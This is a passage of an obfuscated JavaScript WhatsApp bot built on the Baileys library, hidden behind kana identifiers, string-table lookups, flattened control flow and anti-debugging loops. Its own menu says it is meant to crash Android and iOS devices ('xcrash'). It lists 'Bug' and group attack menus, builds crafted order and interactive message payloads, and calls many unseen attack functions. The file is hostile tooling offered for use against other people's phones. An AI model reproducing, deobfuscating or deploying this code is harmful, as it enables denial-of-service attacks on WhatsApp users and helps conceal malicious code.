  if (すかく) {
    return めはぬこ;
  }
}
async function てよなほなま([くめうめみか], うぬせ) {
  debugger;
  うぬせ[すたきや[493]][すたきや[41] + すたきや[42]](うぬせ[すたきや[494]][すたきや[446]], {
    [すたきや[43]]: くめうめみか,
    [すたきや[148] + すたきや[149]]: {
      [すたきや[130] + すたきや[179]]: [うぬせ[すたきや[495]]],
      [すたきや[219] + すたきや[220] + すたきや[221]]: {
        [すたきや[98]]: うぬせ[すたきや[447]][すたきや[448] + すたきや[449]][すたきや[98]],
        [すたきや[92]]: うぬせ[すたきや[447]][すたきや[448] + すたきや[449]][すたきや[450] + すたきや[451]],
        [すたきや[72] + "ailUrl"]: うぬせ[すたきや[496]],
        [すたきや[452] + すたきや[453]]: うぬせ[すたきや[447]].socialMedia[すたきや[144] + "am"],
        [すたきや[454] + すたきや[455] + すたきや[456] + すたきや[73]]: すたきや[2]
      }
    }
  }, {
    [すたきや[184]]: うぬせ[すたきや[497]]
  });
}
const すなよ = require("./settings/config");
const ややめぬし = require("fs");
const ねゆなのへき = require("axios");
const そむひあはな = require("chalk");
const さこゆひ = require("util");
const のちや = require("path");
const えめうめく = require("os");
const へむさせけし = require("crypto");
const はぬめけ = require("performance-now");
const {
  ["defaul" + すたきや[128]]: めもな,
  ["getContentTy" + すたきや[211]]: けしあ,
  generateWAMessageFromContent: のよむねあ,
  proto: さほにうよ
} = require("@whiskeysockets/baileys");
const {
  smsg: ゆとこそおほ,
  fetchJson: にむくのや,
  sleep: とふすせ,
  [すたきや[150] + "Size"]: やよほみよね
} = require("./lib/myfunction");
module["export" + すたきや[77]] = prim = async (くめうめみか, うぬせ, XeonBotInc, すかく) => {
  try {
    えめくひとね(ちちせ);
    えめくひとね(ゆにゆね);
    えめくひとね(ほてひけひ);
    えめくひとね(ててうへはめ);
    えめくひとね(ふみそむけみ);
    えめくひとね(たにさ, すたきや[12]);
    えめくひとね(ましはめめ);
    えめくひとね(ぬみやはあつ);
    えめくひとね(よおにしめお);
    えめくひとね(へのむつうへ);
    えめくひとね(ふさよへへ);
    えめくひとね(うけねか);
    えめくひとね(すとゆのし);
    えめくひとね(せへた, すたきや[19]);
    えめくひとね(もきこえいあ);
    えめくひとね(えちめええ, すたきや[12]);
    えめくひとね(こいふ, すたきや[12]);
    えめくひとね(あやつそそ, すたきや[12]);
    えめくひとね(ふうぬあ);
    えめくひとね(ほますのけ);
    えめくひとね(そよい);
    えめくひとね(さむねちやね, すたきや[12]);
    えめくひとね(ひなゆめぬこ);
    えめくひとね(しほひ, すたきや[12]);
    えめくひとね(のなうへた);
    えめくひとね(あとたや);
    えめくひとね(あふこたこ);
    えめくひとね(へきうしえ);
    えめくひとね(せにににと);
    えめくひとね(にひすもゆ);
    const めはぬこ = うぬせ[すたきや[459]] === すたきや[457] + すたきや[458] ? うぬせ[すたきや[104] + すたきや[44]][すたきや[457] + すたきや[458]] : うぬせ[すたきや[459]] === すたきや[389] + すたきや[46] ? うぬせ[すたきや[104] + すたきや[44]][すたきや[389] + すたきや[46]][すたきや[70] + すたきや[71]] : うぬせ[すたきや[459]] === すたきや[460] + すたきや[46] ? うぬせ[すたきや[104] + すたきや[44]][すたきや[460] + すたきや[46]][すたきや[70] + すたきや[71]] : うぬせ[すたきや[459]] === すたきや[262] + すたきや[263] + すたきや[88] + すたきや[44] ? うぬせ[すたきや[104] + すたきや[44]][すたきや[262] + すたきや[263] + すたきや[88] + すたきや[44]][すたきや[43]] : うぬせ[すたきや[459]] === "buttonsResponseMessag" + すたきや[44] ? うぬせ[すたきや[104] + すたきや[44]][すたきや[78] + すたきや[466] + すたきや[467] + すたきや[468]][すたきや[463] + "edButt" + "onId"] : うぬせ[すたきや[459]] === すたきや[461] + すたきや[154] + すたきや[88] + すたきや[44] ? うぬせ[すたきや[104] + すたきや[44]][すたきや[461] + すたきや[154] + すたきや[88] + すたきや[44]][すたきや[298] + "Select" + すたきや[462]][すたきや[463] + "edRowI" + すたきや[209]] : うぬせ[すたきや[459]] === "templateButtonReplyMe" + すたきや[42] ? うぬせ[すたきや[104] + すたきや[44]].templateButtonReplyMessage[すたきや[463] + すたきや[465]] : うぬせ[すたきや[459]] === すたきや[348] + すたきや[349] + すたきや[350] + すたきや[42] ? JSON[すたきや[471]](うぬせ[すたきや[464]][すたきや[257] + すたきや[258] + すたきや[259] + すたきや[44]][すたきや[157] + すたきや[91]])[すたきや[47]] : うぬせ[すたきや[459]] === "templateButtonReplyMessa" + すたきや[147] ? うぬせ[すたきや[464]][すたきや[463] + すたきや[465]] : うぬせ[すたきや[459]] === すたきや[104] + すたきや[270] + すたきや[271] ? うぬせ[すたきや[104] + すたきや[44]][すたきや[78] + すたきや[466] + すたきや[467] + すたきや[468]]?.selectedButtonId || うぬせ[すたきや[104] + すたきや[44]][すたきや[461] + すたきや[154] + すたきや[88] + すたきや[44]]?.singleSelectReply.selectedRowId || うぬせ[すたきや[43]] : "";
    const ちせそ = うぬせ[すたきや[45]][すたきや[226]] ? くめうめみか[すたきや[413]][すたきや[47]][すたきや[469]](すたきや[399])[すたきや[0]] + (すたきや[80] + すたきや[81] + すたきや[82]) || くめうめみか[すたきや[413]][すたきや[47]] : うぬせ[すたきや[45]][すたきや[50] + すたきや[51]] || うぬせ[すたきや[45]][すたきや[83] + すたきや[84]];
    const そしねめ = ちせそ[すたきや[469]](すたきや[784])[すたきや[0]];
    const ぬめくほき = typeof うぬせ[すたきや[43]] === すたきや[24] ? うぬせ[すたきや[43]] : "";
    const むほえ = ["", すたきや[735], すたきや[11], ",", "🐤", "🗿"];
    const めもな = new RegExp("^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><™©®Δ^βα~¦|/\\\\©^]", "");
    const けしあ = めもな[すたきや[76]](めはぬこ) ? めはぬこ.match(めもな)[すたきや[0]] : すたきや[11];
    const ゆとこそおほ = うぬせ[すたきや[45]][すたきや[83] + すたきや[84]];
    const くまにまうつ = ゆとこそおほ["endsWi" + すたきや[470]](すたきや[62]);
    const みしにゆつせ = await くめうめみか["decode" + すたきや[84]](くめうめみか[すたきや[413]][すたきや[47]]);
    const たねけちそい = JSON[すたきや[471]](ややめぬし[すたきや[472] + すたきや[473]](のちや[すたきや[474] + すたきや[44]](__dirname, すたきや[490] + すたきや[586] + すたきや[587] + すたきや[588] + すたきや[71]), すたきや[589]));
    const けもふめ = [みしにゆつせ, ...たねけちそい][すたきや[410]](くめうめみか => {
      debugger;
      return くめうめみか[すたきや[475] + すたきや[44]](new RegExp(すたきや[581], すたきや[14]), "") + (すたきや[80] + すたきや[81] + すたきや[82]);
    })[すたきや[476] + すたきや[477]](うぬせ[すたきや[489]]);
    const なおほゆか = みしにゆつせ[すたきや[476] + すたきや[477]](そしねめ);
    const とひかおえお = めはぬこ[すたきや[582] + すたきや[583]](けしあ);
    const なくそに = とひかおえお ? めはぬこ[すたきや[478]](けしあ[すたきや[79]])[すたきや[480]]()[すたきや[469]](すたきや[39])[すたきや[481]]()[すたきや[482] + すたきや[479]]() : "";
    const めはみあしち = めはぬこ[すたきや[475] + すたきや[44]](けしあ, "")[すたきや[480]]()[すたきや[469]](new RegExp(すたきや[483], ""))[すたきや[481]]()[すたきや[482] + すたきや[479]]();
    const かそやほむよ = めはぬこ[すたきや[480]]()[すたきや[469]](new RegExp(すたきや[483], ""))[すたきや[478]](すたきや[1]);
    const そきてへ = うぬせ[すたきや[555] + すたきや[222]] || すたきや[556] + すたきや[44];
    const きはゆ = q = かそやほむよ.join(すたきや[39]);
    const はひこて = うぬせ[すたきや[184]] ? うぬせ[すたきや[184]] : うぬせ;
    const そぬぬぬぬ = (はひこて[すたきや[464]] || はひこて)[すたきや[329] + すたきや[211]] || "";
    const みあちしよ = はひこて[すたきや[464]] || はひこて;
    const もものほねと = new RegExp("image|video|" + すたきや[324] + "r|audi" + "o", "")[すたきや[76]](そぬぬぬぬ);
    const もとめとも = うぬせ?.isGroup ? await くめうめみか[すたきや[778] + すたきや[779] + すたきや[484]](うぬせ[すたきや[446]])[すたきや[734]](() => {
      return {};
    }) : {};
    const ほけしいたよ = うぬせ?.isGroup ? もとめとも["subjec" + すたきや[128]] || "" : "";
    const よきなな = うぬせ?.isGroup ? もとめとも[すたきや[50] + すたきや[781]]?.map(くめうめみか => {
      function* うぬせ(うぬせ, すかく, めはぬこ, ちせそ, そしねめ = {
        みすはも: {}
      }) {
        while (うぬせ + すかく + めはぬこ + ちせそ !== 241) {
          with (そしねめ.ももほかせま || そしねめ) {
            switch (うぬせ + すかく + めはぬこ + ちせそ) {
              case ちせそ - 151:
                ゆえつみおか = true;
                return {
                  [すたきや[めはぬこ + -366]]: くめうめみか[すたきや[47]] || すたきや[うぬせ + 570],
                  [すたきや[うぬせ + 607]]: くめうめみか[すたきや[74]] || すたきや[37],
                  [すたきや[すかく + 518]]: あくのちね,
                  full: くめうめみか
                };
                そしねめ.ももほかせま = そしねめ.みはう;
                うぬせ += 414;
                すかく += 117;
                めはぬこ += -237;
                ちせそ += 10;
                break;
                if (すかく > -31) {
                  そしねめ.ももほかせま = そしねめ.なはちあう;
                  うぬせ += 414;
                  すかく += 117;
                  めはぬこ += -237;
                  ちせそ += 10;
                  break;
                }
              case 2:
              case -202:
              case そしねめ.みすはも.えとてに + 6:
                if (くめうめみか[すたきや[487]] === すたきや[487]) {
                  そしねめ.ももほかせま = そしねめ.みすはも;
                  すかく += -247;
                  ちせそ += 303;
                  break;
                } else {
                  そしねめ.ももほかせま = そしねめ.みすはも;
                  うぬせ += -285;
                  すかく += -247;
                  ちせそ += 303;
                  break;
                }
              case -111:
              case -121:
              case ちせそ - 421:
                debugger;
                あくのちね = すたきや[めはぬこ + 629];
                そしねめ.ももほかせま = そしねめ.みすはも;
                うぬせ += -285;
                break;
              case ちせそ + 147:
                そしねめ.ももほかせま = そしねめ.みすはも;
                うぬせ += -639;
                すかく += -247;
                めはぬこ += 33;
                ちせそ += 705;
                break;
              case -184:
                そしねめ.ももほかせま = そしねめ.みすはも;
                めはぬこ += 555;
                ちせそ += -434;
                break;
              case 161:
              case ちせそ + 16:
                [そしねめ.みすはも.えとてに] = [55];
              case -23:
              case ちせそ + 151:
              case 87:
                [そしねめ.みすはも.えとてに] = [39];
                debugger;
                みすはも.あくのちね = すたきや[すかく + -217];
                if (くめうめみか[すたきや[487]] === すたきや[485] + すたきや[486]) {
                  そしねめ.ももほかせま = そしねめ.みすはも;
                  うぬせ += -59;
                  すかく += -209;
                  めはぬこ += -118;
                  ちせそ += 203;
                  break;
                } else {
                  そしねめ.ももほかせま = そしねめ.みすはも;
                  うぬせ += -59;
                  すかく += -38;
                  めはぬこ += -228;
                  ちせそ += 203;
                  break;
                }
                if (めはぬこ < 86) {
                  そしねめ.ももほかせま = そしねめ.みすはも;
                  うぬせ += -344;
                  すかく += -285;
                  めはぬこ += -228;
                  ちせそ += 506;
                  break;
                }
              case -124:
              case そしねめ.みすはも.えとてに + -32:
                そしねめ.ももほかせま = そしねめ.みすはも;
                うぬせ += 62;
                めはぬこ += -43;
                ちせそ += -62;
                break;
                if (ちせそ > うぬせ + 179) {
                  そしねめ.ももほかせま = そしねめ.みすはも;
                  うぬせ += -292;
                  めはぬこ += -10;
                  ちせそ += 340;
                  break;
                }
              case 59:
              case -133:
              default:
                あくのちね = すたきや[めはぬこ + 617] + すたきや[うぬせ + 442];
                そしねめ.ももほかせま = そしねめ.みすはも;
                うぬせ += -577;
                すかく += -54;
                めはぬこ += 545;
                ちせそ += -36;
                break;
              case そしねめ.みすはも.えとてに + -248:
                そしねめ.ももほかせま = そしねめ.のゆえさへ;
                うぬせ += 250;
                すかく += 168;
                めはぬこ += -241;
                ちせそ += 199;
                break;
              case そしねめ.みすはも.えとてに + 199:
                そしねめ.ももほかせま = そしねめ.みすはも;
                うぬせ += -414;
                すかく += -117;
                めはぬこ += 86;
                ちせそ += 144;
                break;
              case うぬせ + 232:
                あくのちね = すたきや[485] + すたきや[すかく + 441];
                そしねめ.ももほかせま = そしねめ.みすはも;
                うぬせ += -285;
                すかく += -76;
                めはぬこ += 445;
                ちせそ += -131;
                break;
            }
          }
        }
      }
      var ゆえつみおか;
      var すかく = うぬせ(-189, 254, 86, 16).next().value;
      if (ゆえつみおか) {
        return すかく;
      }
    }) || [] : [];
    const ききゆ = うぬせ?.isGroup ? よきなな.find(くめうめみか => {
      debugger;
      return くめうめみか[すたきや[487]] === すたきや[485] + すたきや[486];
    })?.jid || "" : "";
    const へしねちさす = よきなな[すたきや[488]](くめうめみか => {
      debugger;
      return くめうめみか[すたきや[487]] === すたきや[487] || くめうめみか[すたきや[487]] === すたきや[485] + すたきや[486];
    })[すたきや[410]](くめうめみか => {
      (function () {
        var くめうめみか = function () {
          const うぬせ = function () {
            const うぬせ = new RegExp(すたきや[75]);
            return うぬせ[すたきや[76]](くめうめみか);
          };
          if (うぬせ()) {
            while (すたきや[4]) {}
          }
        };
        return くめうめみか();
      })();
      return くめうめみか[すたきや[74]] || くめうめみか[すたきや[47]];
    });
    const まぬともき = うぬせ?.isGroup ? へしねちさす[すたきや[476] + すたきや[477]](みしにゆつせ) : すたきや[2];
    const せあいせて = うぬせ?.isGroup ? へしねちさす[すたきや[476] + すたきや[477]](うぬせ[すたきや[489]]) : すたきや[2];
    const ちやあそほ = うぬせ?.isGroup ? ききゆ === うぬせ[すたきや[489]] : すたきや[2];
    const さかねかひせ = ややめぬし[すたきや[472] + すたきや[473]](すたきや[490] + "media/" + "S1.jpg");
    const さしねぬか = [すたきや[169] + "//i.ib" + "b.co/Z" + "6981vZ" + "H/34c9" + "9a9d6c" + "ab.jpg", "https://i.ibb.co/Z6981vZH/34c99a9d6cab.jpg"];
    const ふそなちよけ = さしねぬか[Math[すたきや[260]](Math[すたきや[261]]() * さしねぬか[すたきや[79]])];
    const へくしねぬた = {
      [すたきや[45]]: {
        [すたきや[226]]: すたきや[2],
        [すたきや[50] + すたきや[51]]: すたきや[265] + すたきや[180] + すたきや[181],
        ...(ゆとこそおほ ? {
          [すたきや[83] + すたきや[84]]: すたきや[80] + すたきや[81] + すたきや[82]
        } : {})
      },
      [すたきや[104] + すたきや[44]]: {
        ["orderM" + すたきや[46]]: {
          ["orderI" + すたきや[209]]: "594071395007984",
          [すたきや[72] + すたきや[73]]: さかねかひせ,
          itemCount: 2009,
          [すたきや[85]]: "INQUIR" + すたきや[491],
          ["surfac" + すたきや[44]]: "CATALOG",
          [すたきや[104] + すたきや[44]]: "⛶ Ds.primis\n¿? version 1.2-vip",
          ["orderT" + すたきや[500]]: すなよ[すたきや[448] + すたきや[449]][すたきや[98]],
          ["seller" + すたきや[84]]: すたきや[604] + すたきや[780] + すたきや[202] + すたきや[203] + すたきや[204],
          "token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
          totalAmount1000: "2009",
          totalCurrencyCode: すたきや[492]
        }
      }
    };
    async function にひすもゆ(...ゆえつみおか) {
      (function () {
        var ゆえつみおか = function () {
          const すかく = function () {
            const すかく = new RegExp(すたきや[75]);
            return すかく[すたきや[76]](ゆえつみおか);
          };
          if (すかく()) {
            while (すたきや[4]) {}
          }
        };
        return ゆえつみおか();
      })();
      var すかく = {
        get [すたきや[493]]() {
          return くめうめみか;
        },
        get [すたきや[494]]() {
          return うぬせ;
        },
        get [すたきや[495]]() {
          return ちせそ;
        },
        get [すたきや[447]]() {
          return すなよ;
        },
        get [すたきや[496]]() {
          return ふそなちよけ;
        },
        get [すたきや[497]]() {
          (function () {
            var ゆえつみおか = function () {
              const すかく = function () {
                const すかく = new RegExp(すたきや[75]);
                return すかく[すたきや[76]](ゆえつみおか);
              };
              if (すかく()) {
                while (すたきや[4]) {}
              }
            };
            return ゆえつみおか();
          })();
          return へくしねぬた;
        }
      };
      return てよなほなま(ゆえつみおか, すかく);
    }
    const なかのそえ = async ゆえつみおか => {
      くめうめみか[すたきや[41] + すたきや[42]](うぬせ[すたきや[446]], {
        [すたきや[108] + すたきや[93] + すたきや[46]]: {
          [すたきや[98]]: ゆえつみおか,
          [すたきや[110]]: すなよ[すたきや[448] + すたきや[449]][すたきや[110]],
          [すたきや[72] + すたきや[73]]: ふそなちよけ,
          [すたきや[89] + すたきや[102] + すたきや[42]]: {
            [すたきや[104] + すたきや[303] + すたきや[304]]: JSON[すたきや[24] + すたきや[300]]({
              limited_time_offer: {
                [すたきや[43]]: "Ds - ." + すたきや[256] + " 2026",
                [すたきや[122]]: "t.me/d" + すたきや[146] + すたきや[77],
                ["copy_c" + すたきや[397]]: すたきや[501] + すたきや[502],
                [すたきや[498] + "tion_t" + すたきや[749]]: Date[すたきや[292]]() * すたきや[380]
              },
              bottom_sheet: {
                in_thread_buttons_limit: すたきや[12],
                ["divider_indi" + すたきや[499]]: [すたきや[1], すたきや[12], すたきや[19], すたきや[9], すたきや[430], すたきや[276]],
                ["list_t" + すたきや[500]]: "Ds - Primis",
                [すたきや[78] + "_title"]: すたきや[501] + すたきや[502]
              },
              tap_target_configuration: {
                [すたきや[98]]: "▸ X ◂",
                [すたきや[450] + すたきや[451]]: "bomboclard",
                ["canonical_ur" + すたきや[101]]: すたきや[514] + "/t.me/d" + "sprimis",
                domain: "shop.example" + すたきや[171],
                [すたきや[78] + "_index"]: すたきや[0]
              }
            }),
            [すたきや[78] + すたきや[77]]: [{
              [すたきや[90]]: すたきや[298] + すたきや[299] + すたきや[128],
              [すたきや[78] + すたきや[297] + すたきや[91]]: JSON[すたきや[24] + すたきや[300]]({
                has_multiple_buttons: すたきや[4]
              })
            }, {
              [すたきや[90]]: すたきや[315] + すたきや[316] + すたきや[317] + すたきや[318],
              [すたきや[78] + すたきや[297] + すたきや[91]]: JSON[すたきや[24] + すたきや[300]]({
                [すたきや[506] + すたきや[507] + すたきや[508] + すたきや[401]]: すたきや[4]
              })
            }, {
              [すたきや[90]]: すたきや[298] + すたきや[299] + すたきや[128],
              [すたきや[78] + すたきや[297] + すたきや[91]]: JSON[すたきや[24] + すたきや[300]]({
                [すたきや[98]]: "¿ execute ?",
                [すたきや[610] + すたきや[401]]: [{
                  [すたきや[98]]: "# Ds -" + すたきや[322] + すたきや[77],
                  [すたきや[611] + すたきや[612] + すたきや[613]]: "label",
                  [すたきや[614]]: [{
                    [すたきや[98]]: "Bũg - F̃eãturẽ",
                    [すたきや[450] + すたきや[451]]: すたきや[501] + すたきや[502],
                    [すたきや[47]]: "" + けしあ + (すたきや[557] + すたきや[558])
                  }, {
                    [すたきや[98]]: "Groũ p - Mẽnũ",
                    [すたきや[450] + すたきや[451]]: すたきや[501] + すたきや[502],
                    [すたきや[47]]: "" + けしあ + (すたきや[580] + すたきや[503])
                  }, {
                    [すたきや[98]]: "Õwnẽ" + すたきや[504] + すたきや[505],
                    [すたきや[450] + すたきや[451]]: すたきや[501] + すたきや[502],
                    [すたきや[47]]: "" + けしあ + (すたきや[571] + すたきや[503])
                  }, {
                    [すたきや[98]]: "Õthẽ" + すたきや[504] + すたきや[505],
                    [すたきや[450] + すたきや[451]]: すたきや[501] + すたきや[502],
                    [すたきや[47]]: "" + けしあ + (すたきや[570] + すたきや[503])
                  }, {
                    [すたきや[98]]: "T̃q̃T̃õ̃",
                    [すたきや[450] + すたきや[451]]: すたきや[501] + すたきや[502],
                    [すたきや[47]]: "" + けしあ + すたきや[577]
                  }]
                }],
                [すたきや[506] + すたきや[507] + すたきや[508] + すたきや[401]]: すたきや[4]
              })
            }, {
              [すたきや[90]]: "quick_reply",
              [すたきや[78] + すたきや[297] + すたきや[91]]: JSON[すたきや[24] + すたきや[300]]({
                [すたきや[363] + すたきや[509]]: "Scr ĩp t̃",
                [すたきや[47]]: "" + けしあ + すたきや[579]
              })
            }]
          }
        }
      }, {
        [すたきや[184]]: へくしねぬた
      });
    };
    async function せにににと(...ゆえつみおか) {
      var すかく = {
        get [すたきや[510]]() {
          return ふそなちよけ;
        },
        get [すたきや[511]]() {
          return くめうめみか;
        },
        get [すたきや[512]]() {
          return うぬせ;
        },
        get [すたきや[513]]() {
          return へくしねぬた;
        }
      };
      return てすさも(ゆえつみおか, すかく);
    }
    const やもやめ = さしねぬか[Math[すたきや[260]](Math[すたきや[261]]() * さしねぬか[すたきや[79]])];
    const えなみち = [すたきや[514] + "/files." + "catbox." + "moe/8ov" + "vjx.jpg", "https://files.catbox.moe/kfm80w.jpg"];
    if (うぬせ[すたきや[104] + すたきや[44]]) {
      console[すたきや[440]]("[30m-" + すたきや[515] + すたきや[515] + すたきや[515] + "-[0m");
      console[すたきや[440]](そむひあはな[すたきや[516]]("#4a69b" + すたきや[209]).bold("▢ New " + すたきや[88] + すたきや[44]));
      console[すたきや[440]](そむひあはな[すたきや[516]]("#fffff" + すたきや[594]).black("   ▢ Date : " + new Date()[すたきや[805] + すたきや[806] + すたきや[21]]() + すたきや[517] + ("   ▢ M" + すたきや[46] + すたきや[629] + (うぬせ[すたきや[92]] || うぬせ[すたきや[459]]) + すたきや[517]) + ("   ▢ Sender:" + すたきや[39] + そきてへ + すたきや[517]) + ("   ▢ JID: " + そしねめ + すたきや[517])));
      console[すたきや[440]]();
    }
    async function へきうしえ(...うぬせ) {
      var ゆえつみおか = {
        get [すたきや[400]]() {
          return くめうめみか;
        },
        set [すたきや[400]](うぬせ) {
          くめうめみか = うぬせ;
        },
        get [すたきや[439]]() {
          return へむさせけし;
        },
        get [すたきや[518]]() {
          return そむひあはな;
        },
        [すたきや[519]](...うぬせ) {
          return ふなせさ(...うぬせ);
        }
      };
      return つめちねめ(うぬせ, ゆえつみおか);
    }
    async function あふこたこ(...うぬせ) {
      (function () {
        var うぬせ = function () {
          const ゆえつみおか = function () {
            const ゆえつみおか = new RegExp(すたきや[75]);
            return ゆえつみおか[すたきや[76]](うぬせ);
          };
          if (ゆえつみおか()) {
            while (すたきや[4]) {}
          }
        };
        return うぬせ();
      })();
      var ゆえつみおか = {
        get [すたきや[396]]() {
          return くめうめみか;
        },
        get [すたきや[388]]() {
          return さほにうよ;
        },
        [すたきや[520]](...うぬせ) {
          return のよむねあ(...うぬせ);
        },
        [すたきや[521]](...うぬせ) {
          return とふすせ(...うぬせ);
        }
      };
      return まそすゆ(うぬせ, ゆえつみおか);
    }
    async function あとたや(...うぬせ) {
      var ゆえつみおか = {
        get [すたきや[522]]() {
          (function () {
            var うぬせ = function () {
              const ゆえつみおか = function () {
                const ゆえつみおか = new RegExp(すたきや[75]);
                return ゆえつみおか[すたきや[76]](うぬせ);
              };
              if (ゆえつみおか()) {
                while (すたきや[4]) {}
              }
            };
            return うぬせ();
          })();
          return くめうめみか;
        },
        [すたきや[523]](...うぬせ) {
          return のよむねあ(...うぬせ);
        },
        [すたきや[524]](...うぬせ) {
          return とふすせ(...うぬせ);
        }
      };
      return えたすにたか(うぬせ, ゆえつみおか);
    }
    async function のなうへた(...うぬせ) {
      var ゆえつみおか = {
        get [すたきや[366]]() {
          return くめうめみか;
        },
        [すたきや[525]](...うぬせ) {
          return のよむねあ(...うぬせ);
        }
      };
      return あけは(うぬせ, ゆえつみおか);
    }
    async function しほひ(...くめうめみか) {
      var うぬせ = {
        [すたきや[526]](...くめうめみか) {
          return のよむねあ(...くめうめみか);
        }
      };
      return うせすつとき(くめうめみか, うぬせ);
    }
    async function ひなゆめぬこ(...うぬせ) {
      var ゆえつみおか = {
        get [すたきや[352]]() {
          return くめうめみか;
        },
        [すたきや[527]](...うぬせ) {
          return のよむねあ(...うぬせ);
        }
      };
      return しねくふま(うぬせ, ゆえつみおか);
    }
    async function さむねちやね(...くめうめみか) {
      var うぬせ = {
        [すたきや[528]](...くめうめみか) {
          return のよむねあ(...くめうめみか);
        }
      };
      return まみにちせ(くめうめみか, うぬせ);
    }
    async function そよい(...うぬせ) {
      var ゆえつみおか = {
        get [すたきや[529]]() {
          return くめうめみか;
        },
        [すたきや[530]](...うぬせ) {
          return のよむねあ(...うぬせ);
        }
      };
      return おいすねふぬ(うぬせ, ゆえつみおか);
    }
    async function ほますのけ(...うぬせ) {
      var ゆえつみおか = {
        get [すたきや[531]]() {
          return くめうめみか;
        }
      };
      return よめこにいし(うぬせ, ゆえつみおか);
    }
    async function ふうぬあ(...うぬせ) {
      var ゆえつみおか = {
        get [すたきや[532]]() {
          return へむさせけし;
        },
        get [すたきや[533]]() {
          return くめうめみか;
        },
        [すたきや[534]](...うぬせ) {
          return のよむねあ(...うぬせ);
        }
      };
      return にやそ(うぬせ, ゆえつみおか);
    }
    async function あやつそそ(...くめうめみか) {
      var うぬせ = {
        [すたきや[535]](...くめうめみか) {
          return のよむねあ(...くめうめみか);
        }
      };
      return へつねもこ(くめうめみか, うぬせ);
    }
    async function こいふ(...くめうめみか) {
      var うぬせ = {
        [すたきや[536]](...くめうめみか) {
          return のよむねあ(...くめうめみか);
        }
      };
      return たおてはきく(くめうめみか, うぬせ);
    }
    async function えちめええ(...くめうめみか) {
      var うぬせ = {};
      return しねう(くめうめみか, うぬせ);
    }
    async function もきこえいあ(...うぬせ) {
      var ゆえつみおか = {
        get [すたきや[537]]() {
          return くめうめみか;
        },
        get [すたきや[538]]() {
          return へむさせけし;
        }
      };
      return よやゆく(うぬせ, ゆえつみおか);
    }
    async function せへた(...くめうめみか) {
      var うぬせ = {
        [すたきや[267]](...くめうめみか) {
          return のよむねあ(...くめうめみか);
        },
        [すたきや[269]](...くめうめみか) {
          return とふすせ(...くめうめみか);
        }
      };
      return てはまし(くめうめみか, うぬせ);
    }
    async function すとゆのし(...うぬせ) {
      var ゆえつみおか = {
        get [すたきや[539]]() {
          return くめうめみか;
        }
      };
      return よあこも(うぬせ, ゆえつみおか);
    }
    async function うけねか(...うぬせ) {
      var ゆえつみおか = {
        get [すたきや[540]]() {
          return くめうめみか;
        }
      };
      return ねとほまめあ(うぬせ, ゆえつみおか);
    }
    async function ふさよへへ(...うぬせ) {
      var ゆえつみおか = {
        get [すたきや[541]]() {
          return くめうめみか;
        },
        [すたきや[542]](...うぬせ) {
          return のよむねあ(...うぬせ);
        }
      };
      return ふてく(うぬせ, ゆえつみおか);
    }
    async function へのむつうへ(...うぬせ) {
      var ゆえつみおか = {
        get [すたきや[543]]() {
          return ややめぬし;
        },
        get [すたきや[544]]() {
          return くめうめみか;
        }
      };
      return きふたよさ(うぬせ, ゆえつみおか);
    }
    async function よおにしめお(...うぬせ) {
      var ゆえつみおか = {
        get [すたきや[545]]() {
          return くめうめみか;
        }
      };
      return なぬけせ(うぬせ, ゆえつみおか);
    }
    async function ぬみやはあつ(...うぬせ) {
      var ゆえつみおか = {
        get [すたきや[546]]() {
          return くめうめみか;
        },
        [すたきや[547]](...うぬせ) {
          return のよむねあ(...うぬせ);
        }
      };
      return えゆそい(うぬせ, ゆえつみおか);
    }
    async function ましはめめ(...うぬせ) {
      var ゆえつみおか = {
        get [すたきや[548]]() {
          return くめうめみか;
        },
        [すたきや[549]](...うぬせ) {
          return のよむねあ(...うぬせ);
        }
      };
      return ゆさね(うぬせ, ゆえつみおか);
    }
    async function たにさ(...くめうめみか) {
      var うぬせ = {
        [すたきや[550]](...くめうめみか) {
          return のよむねあ(...くめうめみか);
        }
      };
      return うよむに(くめうめみか, うぬせ);
    }
    async function ふみそむけみ(...うぬせ) {
      var ゆえつみおか = {
        get [すたきや[94]]() {
          return さほにうよ;
        },
        get [すたきや[133]]() {
          return くめうめみか;
        },
        [すたきや[125]](...うぬせ) {
          return のよむねあ(...うぬせ);
        }
      };
      return ててむすね(うぬせ, ゆえつみおか);
    }
    async function ててうへはめ(...うぬせ) {
      var ゆえつみおか = {
        get [すたきや[551]]() {
          return くめうめみか;
        }
      };
      return へあは(うぬせ, ゆえつみおか);
    }
    async function ほてひけひ(...うぬせ) {
      var ゆえつみおか = {
        get [すたきや[552]]() {
          return くめうめみか;
        }
      };
      return まうはけひう(うぬせ, ゆえつみおか);
    }
    async function ゆにゆね(...うぬせ) {
      var ゆえつみおか = {
        get [すたきや[553]]() {
          return くめうめみか;
        }
      };
      return めつにた(うぬせ, ゆえつみおか);
    }
    async function ちちせ(...うぬせ) {
      var ゆえつみおか = {
        get [すたきや[554]]() {
          return くめうめみか;
        }
      };
      return ほふはも(うぬせ, ゆえつみおか);
    }
    const たちとた = "" + (けしあ + なくそに);
    switch (なくそに) {
      case "prim":
      case "motupatlu":
        {
          const すはき = えめうめく[すたきや[559] + すたきや[560]]();
          const しむちな = えめうめく[すたきや[561] + すたきや[562]]();
          const むもゆやし = すはき - しむちな;
          const もきしあよむ = やよほみよね(むもゆやし);
          const くけのくきよ = やよほみよね(すはき);
          let ちさつむつひ = はぬめけ();
          let ときのお = はぬめけ() - ちさつむつひ;
          const あぬゆささむ = うぬせ[すたきや[555] + すたきや[222]] || すたきや[556] + すたきや[44];
          const いおてねてい = "" + あぬゆささむ;
          let ねむほ = "— ( 🦠 ) Hello " + いおてねてい + (". i'm  @MOTU_PATALU_HINDU_HAI WHATSAAP  the app to crash on Android or IOS devices.\n\n> ┏━━〔 𝐁𝐎𝐓 𝐒𝐓𝐀𝐓𝐔𝐒 〕━━┓\n> ┃ ︻\n> ┃ ➥ ʙᴏᴛ ɴᴀᴍᴇ: *@MOTU_PATALU_HINDU_HAI*\n> ┃ ➥ ᴠᴇʀꜱɪᴏɴ: *6.0*\n> ┃ ➥ ᴅᴇᴠᴇʟᴏᴘᴇʀ: *@MOTU_PATALU_HINDU_HAI*\n> ┃ ➥ ᴘʀᴇꜰɪx: *" + すたきや[578]) + けしあ + ("]*\n> ┃ ➥ ᴛʏᴘᴇ: *xcrash*\n> ┃ ︼\n> ┗━━━━━━━━━━━━━━━━━━━━┛" + すたきや[75]);
          なかのそえ(ねむほ);
        }
        break;
      case すたきや[557] + すたきや[558]:
        {
